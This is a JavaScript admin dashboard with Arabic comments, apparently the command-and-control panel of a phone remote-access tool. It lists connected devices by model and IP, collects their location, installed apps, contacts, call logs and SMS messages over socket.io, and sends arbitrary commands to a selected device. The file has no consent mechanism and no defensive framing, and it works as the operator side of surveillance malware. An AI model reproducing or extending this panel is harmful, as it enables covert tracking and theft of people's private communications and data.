const socket = io();
socket.emit('adminJoin');

const devices = {};
let selectedDevice = null;

// عناصر DOM
const deviceListEl = document.getElementById('deviceList');
const deviceSelectEl = document.getElementById('deviceSelect');
const deviceInfoEl = document.getElementById('deviceInfo');
const logListEl = document.getElementById('logList');
const commandActionEl = document.getElementById('commandAction');
const commandDataEl = document.getElementById('commandData');
const sendCommandBtn = document.getElementById('sendCommand');

// تبديل التبويبات
document.querySelectorAll('.tab').forEach(tab=>{
  tab.addEventListener('click', ()=>{
    document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
    tab.classList.add('active');
    document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));
    document.getElementById('tab-'+tab.dataset.tab).classList.add('active');
  });
});

// تحديث قائمة الأجهزة
function refreshDeviceList(){
  deviceListEl.innerHTML = '';
  deviceSelectEl.innerHTML = '';
  Object.values(devices).forEach(d=>{
    const li = document.createElement('li');
    li.textContent = `${d.id} — ${d.model || 'unknown'} — IP: ${d.ip || 'N/A'}`;
    li.onclick = ()=> selectDevice(d.id);
    deviceListEl.appendChild(li);

    const opt = document.createElement('option');
    opt.value = d.id;
    opt.textContent = `${d.id} (${d.model || 'unknown'})`;
    deviceSelectEl.appendChild(opt);
  });
}

// اختيار جهاز
function selectDevice(id){
  selectedDevice = id;
  Object.values(deviceListEl.children).forEach(li=>li.style.background='');
  const li = Array.from(deviceListEl.children).find(x=>x.textContent.startsWith(id));
  if(li) li.style.background='#001219';
  updateDeviceInfo();
}

// تحديث بيانات الجهاز
function updateDeviceInfo(){
  if(!selectedDevice || !devices[selectedDevice]){
    deviceInfoEl.textContent = 'اختر جهازاً من تبويب "الأجهزة"';
    return;
  }
  const d = devices[selectedDevice];
  deviceInfoEl.textContent = JSON.stringify(d, null, 2);
}

// إضافة سجل
function addLog(msg){
  const li = document.createElement('li');
  li.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
  logListEl.appendChild(li);
}

// استقبال أجهزة جديدة
socket.on('join', d=>{
  devices[d.id] = d;
  refreshDeviceList();
  addLog(`جهاز متصل: ${d.id}`);
});

// استقبال التحديثات من الأجهزة
['getLocation','getInstalledApps','getContacts','getCallLog','getSMS','getExtraData'].forEach(ev=>{
  socket.on(ev,payload=>{
    const id = payload.id;
    if(!devices[id]) devices[id]={id};
    devices[id][ev] = payload.data;
    addLog(`حدث ${ev} من ${id}`);
    updateDeviceInfo();
  });
});

// إرسال أوامر
sendCommandBtn.addEventListener('click', ()=>{
  if(!selectedDevice) { alert('اختر جهازاً'); return; }
  let data = null;
  if(commandDataEl.value.trim()) {
    try { data = JSON.parse(commandDataEl.value.trim()); }
    catch(e){ alert('JSON غير صالح'); return; }
  }
  socket.emit('request', {to:selectedDevice, action:commandActionEl.value, data});
  addLog(`أرسل الأمر: ${commandActionEl.value} → ${selectedDevice}`);
});
